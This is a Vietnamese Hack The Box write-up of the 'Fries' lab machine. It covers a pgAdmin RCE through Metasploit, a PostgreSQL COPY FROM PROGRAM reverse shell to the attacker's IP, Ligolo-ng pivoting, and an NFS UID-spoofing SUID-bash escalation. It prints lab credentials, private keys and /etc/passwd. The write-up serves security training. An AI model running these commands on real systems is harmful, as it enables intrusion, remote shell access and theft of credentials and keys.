---
title: Fries
description: bài này khoai 
date: 2026-01-01 00:00:00+0000
image: image.png
categories:
    - HTB
tags:
    - Window
weight: Hard
---

- Scan port như thường lệ , ta có được 22 , 80  
![image](https://hackmd.io/_uploads/S1IAXfoPZl.png)

![image](https://hackmd.io/_uploads/r1N1NGsvWe.png)

```c
nmap -p- -sC -sV  10.10.11.97
```

- Cổng 80 là web r 
![image](https://hackmd.io/_uploads/rkL_EMiDWx.png)




- Scan subdomain 
![image](https://hackmd.io/_uploads/rkzZNGjDWl.png)


- Mở ra ta sẽ thấy giao diện khác `http://code.fries.htb`
![image](https://hackmd.io/_uploads/ByXmEMovZg.png)


- Theo đề bài cung cấp ta sẽ đăng nhập với `d.cooper@fries.htb / D4LE11maan!!`

- Để mở rộng atk surface seach từ khóa `fries` trong source để xem còn trang web nào đang được host không 
![image](https://hackmd.io/_uploads/rJNYEMiv-g.png)


- Truy cập vào `http://db-mgmt05.fries.htb` -> version 9.1 . Khiến ta liên tưởng đến CVE ->  [CVE-2025-2945](https://www.cvereports.com/cve-2025-2945-remote-code-execution-in-pgadmin-4/)
![image](https://hackmd.io/_uploads/BkT9NfiDWl.png)

![image](https://hackmd.io/_uploads/B1yhNGoPbx.png)


- Dùng METASPLOIT để RCE pgAdmin4, Tuy nhiên cần tìm user/paswd mới có thể RCE 
- Mục tiêu: pgAdmin 4 trước 9.2. 
- Điều kiện bắt buộc: phải có tài khoản đăng nhập pgAdmin (authenticated) và thường cần thông tin đăng nhập DB để mở/khởi tạo phiên Query Tool (lấy transaction/session cần cho khai thác). 
Rapid7
- Cơ chế lỗi: trong Query Tool, tham số query_commited ở endpoint download bị đưa vào Python eval() không an toàn → dẫn tới thực thi mã từ xa (RCE). 
Rapid7
+1
- Kết quả: nếu thành công, attacker có thể chạy lệnh/mã trên máy chủ chạy pgAdmin (tuỳ cấu hình sẽ chạy với quyền của tiến trình pgAdmin). 
Rapid7

- Thử check các commit đặc biệt 
![image](https://hackmd.io/_uploads/r17TVMoP-x.png)


- Lấy được passwd của database ở  Initial Commit 
- DATABASE_URL=`postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db`
- SECRET_KEY=`y0st528wn1idjk3b9a`
![image](https://hackmd.io/_uploads/rkaT4zjDZl.png)

- RCE thôi 
![image](https://hackmd.io/_uploads/S1tANMsw-l.png)

```code
msfconsole
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set LHOST 10.10.17.152
set LPORT 4444
exploit
```

- Tìm hiểu về sơ đồ mạng ta thấy : `172.18.0.4`
![image](https://hackmd.io/_uploads/r1P1Hzovbl.png)


- Quét các máy trong container
![image](https://hackmd.io/_uploads/Sy1lHfovbe.png)


- Tìm thấy thông tin xác thực  : `PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!` và `PGADMIN_DEFAULT_EMAIL=admin@fries.htb`
```code
 ────────────────────────────────────────────────
│         Docker Host (172.18.0.1)               │
│      Ubuntu Web Server - 192.168.100.2         │
│                                                │
│  ┌──────────────┐  ┌──────────────┐            │
│  │ PostgreSQL   │  │  pgAdmin     │            │
│  │ 172.18.0.3   │  │  172.18.0.4  │ ← BẠN Ở ĐÂY│
│  │  Port 5432   │  │  (exploited) │            │
│  └──────────────┘  └──────────────┘            │
│                                                │
│  NFS Share: /srv/web.fries.htb                 │
└────────────────────────────────────────────────
                    │
                    │ Internal Network
                    ↓
        ┌───────────────────────────┐
        │  DC01.fries.htb           │
        │  192.168.100.1            │
        │  (Domain Controller)      │
        └───────────────────────────┘
```
- Giờ mình sẽ Network Pivoting với Ligolo-ng để có từ container vừa exploit được nhảy ra ngoài mạng nội bội (192.168.....)

```cmd
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
./proxy -selfcert -laddr 0.0.0.0:11601
```
![image](https://hackmd.io/_uploads/BkKeHfsPbe.png)



- Lấy shell từ PostgreSQL do pgAdmin không cho tải file về 

![image](https://hackmd.io/_uploads/H1x-HzsvZe.png)

```code
nc -lvnp 4445
DROP TABLE IF EXISTS cmd;
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.17.152/4445 0>&1"';
```
- Lấy được shell , khi mở server nó sẽ yêu cầu root passwd ta sẽ lấy `PsqLR00tpaSS11`
![image](https://hackmd.io/_uploads/S1qWBzsPWg.png)

- Sau đó tải agent về từ máy atk 
![image](https://hackmd.io/_uploads/HkNGBMjvZg.png)

![image](https://hackmd.io/_uploads/SyhzSfjPWg.png)

```code
python3 -m http.server 8000

perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8000");print $s "GET /agent HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">agent";binmode F;print F while<$s>;close F'
```
- Tạo TUN interface trên Kali
```code
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

ip addr show ligolo -> kiểm tra
```
- Sau đó thực thi agent để kết nối lại máy chủ atk 
![image](https://hackmd.io/_uploads/BJP7BMsv-e.png)


```code
./proxy -selfcert -laddr 0.0.0.0:11601

chmod +x agent
./agent -connect 10.10.17.152:11601 -ignore-cert
```
- Auke giờ setup router
![image](https://hackmd.io/_uploads/SybEHMoDWl.png)

```code
ip route | grep 172.18
ip route | grep 192.168
sudo ip route del 172.18.0.0/16 dev br-015726ca74dc -> xóa router đã tồn tại để ligolo hoạt động
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.18.0.0/16 dev ligolo
sudo ip route add 192.168.100.0/24 dev ligolo
ip route | grep ligolo -> kiểm tra lại 
```
- Check bằng lệnh ping 
![image](https://hackmd.io/_uploads/S1o4BMsDWl.png)

![image](https://hackmd.io/_uploads/HyBHBfjDZe.png)

```code
ping -c 2 192.168.100.2
```
- SSH vào `192.168.100.2` để kiểm tra NFS , Pass :  `Friesf00Ds2025!!`
![image](https://hackmd.io/_uploads/SkxIrfjDZg.png)

```code
ssh svc@192.168.100.2
```
- Phát hiện NFS share
- NFS (Network File System) là protocol cho phép máy tính chia sẻ thư mục qua mạng. Client có thể mount (gắn kết) thư mục từ xa như thể nó là thư mục local.
- Dấu `*` nghĩa là share này cho phép mọi IP truy cập - một lỗ hổng cấu hình.
- NFS chỉ xác thực dựa trên UID/GID (số ID của user/group), không phải username
- Nếu bạn có UID/GID giống với owner của file, bạn sẽ có quyền tương ứng
![image](https://hackmd.io/_uploads/HysIrzsvZl.png)


- Tuy nhiên quyền thấp nên không được được các file cert
![image](https://hackmd.io/_uploads/HkvPBMiw-l.png)

- Mount NFS từ máy attacker
![image](https://hackmd.io/_uploads/r1-OrMiw-g.png)

```code
# Tạo mount point
sudo mkdir -p /mnt/nfs_fries

# Mount NFS từ target
sudo mount -t nfs 192.168.100.2:/srv/web.fries.htb /mnt/nfs_fries

# Verify
ls -la /mnt/nfs_fries
```

- Tạo user đủ quyền để đọc được cert 
![image](https://hackmd.io/_uploads/rJcuSziPWl.png)

![image](https://hackmd.io/_uploads/BJXFSGjwWg.png)



- Tạo user trên máy atk 
![image](https://hackmd.io/_uploads/H16KSzoDWg.png)

```code
sudo groupadd -g 59605603 infra_managers
sudo useradd -u 117 -g 59605603 -M -s /bin/bash barman_local
id barman_local 
```

- Copy file /bin/bash (shell binary) vào folder shared 
- MỤC ĐÍCH: Tạo một bản copy của bash để ta có thể modify ownership từ xa qua NFS
- 
![image](https://hackmd.io/_uploads/SkvqrGjDbx.png)

![image](https://hackmd.io/_uploads/BybjrMoD-x.png)

![image](https://hackmd.io/_uploads/Hk5iHzovZg.png)

```code
cp /bin/bash /srv/web.fries.htb/shared/target_bash
```
```code
sudo su - barman_local -c "cp /mnt/nfs_fries/shared/target_bash /mnt/nfs_fries/shared/bash2"
sudo su - barman_local -c "chmod 6777 /mnt/nfs_fries/shared/bash2"
```
```code
ls -la /mnt/nfs_fries/shared/bash2
```

- Execute SUID bash trên web server
- 
![image](https://hackmd.io/_uploads/HkEnrMjvZl.png)

```code
cd /srv/web.fries.htb/shared/
./bash2 -p
id
```

- Đọc cert thôi 
- 
![image](https://hackmd.io/_uploads/HJanSMjvWg.png)

```code
ls -la /srv/web.fries.htb/certs/
```
```code
bash2-5.1$ cat /srv/web.fries.htb/certs/ca-key.pem
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCNI/v5iPB/pLeI
5cmnUE1BUZsF05mT1I58Jeil4jgPGr8INb3/dG1d8ypKk4I3Q2FXAOgrlLOVW2ze
NWHPBE0alvTFu8Okkey7bsXU5Nxf32dWq+jin5gjKToXbEFU6o48SpZZDuWVuo7Q
4N7T/0Rv6ZJTpd5r7u2VQV6ahqBdtRHoNCR/niByKBLBSqFX+1kwCJdu4OqCaJNS
VUGBj/QmDIS91vrbF1pk68Y7/uScMX8QzehT/+T/XuBlXx6SuuHWtIZ4H5fJftKf
dkRUHdkGRCbPF/y/9j/FDDdkBgvfTvLu0Lh9p3bqZPMwmi8kONfsBPgSl1C5ww//
WPcU6e+hAgMBAAECggEAD6RARYxOkubPTEWjDn7QwP9pPcEQkRiKXenZmaCzc8EU
ELXcA5aElFfhhPhKAxPdksXP9Rx6tn+2Vf32g/nHDb5TDCLd8LwXT0JcfFaMsbdR
fYJ5wbvMIYFtJbFioCWKc9YUSXRkLy7Iqw9wwm/Uxs5M4CZOuwl0nQjskhV/akL/
u3qqOcBcwq0DpZv4Dw6husKcrSlf7q6jU64eJZ2pfZxBalkMRddMvMiUL4lu3Rzz
eUP7Ffjoc9C2EVyC0XtJzT0Ur+lRLdiYS42oJN0O1V8C4+VKw7XB7+o5OW/bUx5w
CFQQ7KfKuB5Mvr+xcz2sPMQ4PL76L+/FSlAgBFk2/QKBgQC3dzdeJEh0Fw3RlwRJ
S7PRS40kVIjRqmEw3RK48K0/B03B08ExMhFZpZ29C+c1ZzWJBV/PYUEUckuYssiq
ELHUlOtoZtxGlWFLFQj0p84CiCFi9qCBVSB/CX5IDCHR5OcFjr9w0q/DTKkUlUZN
QfPHH6DfA1lTV9xY8kg08rhnVwKBgQDE8P2zoDjbugfzLS23xz29WT506JLHvPlk
I4GPuwM8osExSYSePVvGKeGL2E4pkNhFM7ydnsBrygwO+35f/o9MVK6mQz5GD0pA
y2OhAVIjvUTW/PDrpOdjjPy/PjGIKDxSOcAYzIhpxsvOWymUKo6uF0Zrbu46U+jb
bFLn1NFdxwKBgQCACYIpgDbUVdZ+A9+o610V3p0k0p4dfMORX2eWi9jMWOOKNqbo
F2IGZ0+bRHhaS6oP8yE3UE8j3tQlP/hMv5ProPZdCRQHam7ZAFgcrhNWrvxl3WqM
eAVSwyRPUbA0lIQp28J9EXw6VwDU7Yx/lFx2Bfu2R9cKFBIiPQvpb88DxwKBgQCF
S2sbWZVCOq5Iy8pGueaysqWQMR2vbNsLCPEXHAd70diaiFznUTY9cHlE0plMjsmi
RPsjX6BzFCSHO3b0d/H7QtGWnKqYdp7WLhL3lVJH+EGQlVBm3YzzFyi2M90If9sb
+BRpdH3bwf6NY6xHqWo6sGwsKL+64LIZWT7fxG4UXwKBgQCXjc0iXHVgMqo2v11L
9StL0BZc6xs3VL3zn6E/Sf4ptLfOzr1Z31Owk6it2CwH5QMe2237H7DoTaGdkFpF
moYR5629rNQ8dajTcwTK9f3Vm5Yp8YI290ExIovgF4fS2H1od+YD5Hk2qSlUWDEf
lEFleRF3JdlTO+d45SX4WoO0Fg==
-----END PRIVATE KEY-----
bash2-5.1$ cat /srv/web.fries.htb/certs/ca.pem
-----BEGIN CERTIFICATE-----
MIIDBzCCAe+gAwIBAgIUSlcqOqok3HQM9woDn1LzVmcwXLUwDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIRG9ja2VyQ0EwHhcNMjUwNTI2MTcxMDU4WhcNMjYwNTI2
MTcxMDU4WjATMREwDwYDVQQDDAhEb2NrZXJDQTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAI0j+/mI8H+kt4jlyadQTUFRmwXTmZPUjnwl6KXiOA8avwg1
vf90bV3zKkqTgjdDYVcA6CuUs5VbbN41Yc8ETRqW9MW7w6SR7LtuxdTk3F/fZ1ar
6OKfmCMpOhdsQVTqjjxKllkO5ZW6jtDg3tP/RG/pklOl3mvu7ZVBXpqGoF21Eeg0
JH+eIHIoEsFKoVf7WTAIl27g6oJok1JVQYGP9CYMhL3W+tsXWmTrxjv+5JwxfxDN
6FP/5P9e4GVfHpK64da0hngfl8l+0p92RFQd2QZEJs8X/L/2P8UMN2QGC99O8u7Q
uH2ndupk8zCaLyQ41+wE+BKXULnDD/9Y9xTp76ECAwEAAaNTMFEwHQYDVR0OBBYE
FBrssmkRFMv4JxsJiOROQ5W3X/TlMB8GA1UdIwQYMBaAFBrssmkRFMv4JxsJiORO
Q5W3X/TlMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAFKHOUWX
+q12Vpxg7It+ENlpNarimsTmsrCoRcAkEQnHPQsC2yY3NSMV0ZnYRBx/OtyG++lI
d7af8KU5E8IDbQQTtHWSWy0WD1QbBrIkgnsI48MLTfk/4eDbJ5dM1baEmhK/DEAP
cqGC0GMZ0N600mNysj6QZ+FUfy6YjqZS3HH0hz3yhWwNpaZUCS83H5LPamdX2ET0
9Jto+nDRYvj1hrtDR2aJQ98gTkMlO6QMOefaPeMemo07hBs0dgyWiEmKD8WBxW0h
1LIWU9eWw1kFa27lw/oA4ZaH48K2a4TpAJPfnGGAEQDHA+tytgqUpk+2j6Zb6g11
y9tT1WDrTzwdNtk=
-----END CERTIFICATE-----
bash2-5.1$ cat /srv/web.fries.htb/certs/server-cert.pem
-----BEGIN CERTIFICATE-----
MIIDCTCCAfGgAwIBAgIUG5nEEOe5rMudvK9SoSMUDkxjukEwDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIRG9ja2VyQ0EwHhcNMjUwNTI2MTcxMjQyWhcNMjYwNTI2
MTcxMjQyWjAQMQ4wDAYDVQQDDAVmcmllczCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAJijWsBsMAbc61bgwGH3DfhmmCKFmh7hIcRwhjHqkrhP59IbKC0c
z6e78z41fXXfPTTRaHX/fY9mYDVjphGzsHldlM/ExGqNC3sNz8neZFUGQ5wU3DmP
2Obb7fFdunW7Ja1FMZZsbD4gYyu4zge1SX1br0sJV8TtVayGb095fKwlTJ+jCq5t
WleN++U4h+ZzP7X8CE8ILKBx5eqRbeVcynlyUYFXco0YGyluiHm2jzF5fqikcApc
YmlChVYTwW/MsZoEW8sYVZoUnn5pt2nQeORvlnfS2LUqW1uYjtNG89mS9RM+ho75
rK6TkONizMntJuGs9di118uu8eFDo88m3jcCAwEAAaNYMFYwFAYDVR0RBA0wC4ID
d2VihwR/AAABMB0GA1UdDgQWBBQmv9PLLwJOSaHH1brbMcEsKWtUbjAfBgNVHSME
GDAWgBQa7LJpERTL+CcbCYjkTkOVt1/05TANBgkqhkiG9w0BAQsFAAOCAQEAVmgr
T8Mk6GA9poX30ZZxXezpM3KEF8I2H/7JhRKTqQ6WbkurH49H/t4onVpohyCvubgx
Zsj7n9gIg76EVhEUuKO3KA1XPBWDdhJGTrbgKM8jO2xOAs1uq4NkjTSLTLH8ZIFW
ExqKdkccmXQwhSZZkclfX7FvdLNRr/prNNpOAU4FpEKw+sZEV7O/MXARgZWd2WN2
TArhKXNdqlKcza8jVW6tYM/pIjv8OMBvG/4dj4HeNMD1aR7LzeVLxOGA39ljeFqN
BPAPYGesmQddqXz8LiTfaT6+PbOzSCM67yv7w4LXPAMMvz2ijdI+JdHd8/ikRpcx
spLBZWYBH+iwwkdPFA==
-----END CERTIFICATE-----
bash2-5.1$ cat /srv/web.fries.htb/certs/server-key.pem
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCYo1rAbDAG3OtW
4MBh9w34ZpgihZoe4SHEcIYx6pK4T+fSGygtHM+nu/M+NX113z000Wh1/32PZmA1
Y6YRs7B5XZTPxMRqjQt7Dc/J3mRVBkOcFNw5j9jm2+3xXbp1uyWtRTGWbGw+IGMr
uM4HtUl9W69LCVfE7VWshm9PeXysJUyfowqubVpXjfvlOIfmcz+1/AhPCCygceXq
kW3lXMp5clGBV3KNGBspboh5to8xeX6opHAKXGJpQoVWE8FvzLGaBFvLGFWaFJ5+
abdp0Hjkb5Z30ti1KltbmI7TRvPZkvUTPoaO+ayuk5DjYszJ7SbhrPXYtdfLrvHh
Q6PPJt43AgMBAAECggEACgTpS/LE6EePyopCf7Tci3gK0wXbeLhJkZJtTJpbn23e
K9IM0FyxEeqOkMmEESqG4v31pGpavJMd55WKfz/TRhi9dJ+hKh3nKXLLpQ2VVdba
/rH2IQLc7mlP4hw1Dl/iCtCdNfKrJWX6jskmjiYdyz4GucPEzh30XwHDe0hyoP4H
Px0iI4z2mIxr58qIlfti4OGA97BZJJfqOnJwxCNYK1BpgjGKQITuDs9hKmGUzSY5
FsHZ+Dzvs/rfEc/S4X98KB58QsGS2h4nGwKzs+YmFrQQ+F0haF1QMWQkwCOOaVmq
FFIAWwO/mYeg087n3ym1Mg5mchrBN53DdYfbyftHqQKBgQDNyOp2MTHB7qtgJwEu
nGYSXclUitdkqpzYXhBioY/z0MaJBAci88PcCyT+hGGOu1zWbz4x4o3M/XzNV/UF
0dEB0tp7wwN6hFLmpfApR/zqYGppMykSS8BD8L0eUMP2Dj3ukFSTuuUPXfPwo0BG
lygBnyZM2YRheGTTKtXhPX8Q8wKBgQC94nBP9kBbGg9bloXg43WU3+YUlbh415Bq
WmZp6NaJh6A3BYKlbLY9p5Df9p0iEOtcYG61l/Y8v7BIsgFyeD22HAlVwqcRUyCd
Dod0dNePwddOYXfX66d0bB7woh5JPY9LGdMIA0Pe6Vgzw8smV4msrswaXaXZ/VnV
m/zefQBurQKBgECKBM6wuxRBkEoFsZ82ueSEuYHkUY1m3O4XAjiMxyMGlV2ff8V8
gi7e5+lTB23GYWV3WiA3F5X04lFchqIendhekttB3DNukLl5zYqE41N2jakUvIra
ayBjvkxltC/VY6MQbRYwBWr+YmVULfJ1sbxgd5iel6AiLCz2QEH2EYX1AoGAf/ZK
I8jaY8pzERCmFgCTK4mbXsHq+Byk6NcU70iG01W/xXSEL4DMa04yFov2Jo/qXG1s
DhpjSVsQrFyxFvgq9j98lvu/ZLB1aQHyjKt03R8PPnX2sl7PkWiPjTBjYo4Gs+Cq
U1sH8P+lffTzQVp6oBGH4Di93OKcGJSvWyw4D10CgYAs4XQglmpsUBmY/HtlDPiy
VSSnFn9c1rowAK1MJEi6l0S1lZXVdKMVqV6E/i58LGqoqUXoHlvERfKI8FHp9nKQ
Sf00DSOC7W8uqlWsWSOh9EaCdIcSLSGK4qaXcjwATeiNnt4BMnWxikqc7OxuE807
HmwL9/U//oQhCT0X9pXTww==
-----END PRIVATE KEY-----
bash2-5.1$ 
```

- Đọc pwd                     

![image](https://hackmd.io/_uploads/H1o6SMowbg.png)

```code
bash2-5.1$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin
dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
barman:x:117:120:Backup and Recovery Manager for PostgreSQL,,,:/var/lib/barman:/bin/bash
sssd:x:118:121:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
```
- Đọc nginx config `cat /etc/nginx/sites-enabled/default`
- 
![image](https://hackmd.io/_uploads/H1_RBGjwbl.png)

![image](https://hackmd.io/_uploads/rJIy8zov-x.png)
































